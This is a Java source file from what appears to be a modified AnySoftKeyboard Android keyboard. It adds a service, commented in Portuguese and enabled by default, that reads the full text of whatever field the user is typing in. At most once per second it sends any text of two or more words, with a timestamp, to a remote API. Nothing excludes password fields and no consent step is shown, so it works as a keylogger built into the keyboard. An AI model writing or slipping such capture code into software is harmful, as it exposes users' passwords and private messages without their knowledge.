package com.anysoftkeyboard;

import android.view.inputmethod.ExtractedText;
import android.view.inputmethod.ExtractedTextRequest;
import android.view.inputmethod.InputConnection;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.TimeZone;

public class SubmitTextApiService {
    private final int ONE_SECOND = 1000;
    private final int QTD_MIN_PALAVRAS = 2;

    private long lastTimeMillis;
    private ProjectAPIService projectAPIService;

    // Variavel para controlar se o envio de textos esta habilitado
    // Por padrao vai vim habilitado.
    private boolean isCaptureEnabled = true;

    // Formato para exibir o timestamp (ISO 8601)
    private static final SimpleDateFormat ISO_8601_FORMAT = createISOFormatter();

    private static SimpleDateFormat createISOFormatter () {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", new Locale("pt", "BR"));
        formatter.setTimeZone(TimeZone.getTimeZone("America/Sao_Paulo")); // Define o fuso horário para o Brasil
        return formatter;
    }

    public SubmitTextApiService(){
        this.projectAPIService = new ProjectAPIService();
    }

    // Metodo para ativar ou desativar o envio de textos
    // se true - habilita /  se false - desabilita
    public void setTextCaptureEnabled(boolean enabled) {
        this.isCaptureEnabled = enabled;
    }

    private String getTypedText(InputConnection ic){
        if (ic == null) {
            return null;
        }

        ExtractedText extractedText = ic.getExtractedText(new ExtractedTextRequest(), 0);
        if(extractedText == null || extractedText.text == null) {
            return null;
        }
        CharSequence text = extractedText.text;
        return text.toString();
    }

    private String getCurrentTimestampISO() {
        return ISO_8601_FORMAT.format(new Date());
    }

    private void submitToApi(String text, String timestampISO){
        projectAPIService.submit(text, timestampISO);
        System.out.println("Text and timestamp submitted to the API: Text='" + text + "', TimestampISO='" + timestampISO + "'");
    }

    private boolean verifyMinimumWords(String text){
        return text.split(" ").length >= QTD_MIN_PALAVRAS;
    }

    public void submitText(InputConnection ic) {
        // Verificando se o envio de textos esta habilitado.
        if(!isCaptureEnabled) {
            System.out.println("The text capture is disabled. No text will be sent to the API.");
            return;
        }

        long currentTimeMillis = System.currentTimeMillis();
        if((currentTimeMillis - lastTimeMillis) > ONE_SECOND) {
            String text = getTypedText(ic);
            if(text != null && verifyMinimumWords(text)){
                String timestampISO = getCurrentTimestampISO();
                System.out.println("======================= submit =======================");
                submitToApi(text, timestampISO);
            }
        }
        lastTimeMillis = currentTimeMillis;
    }
}
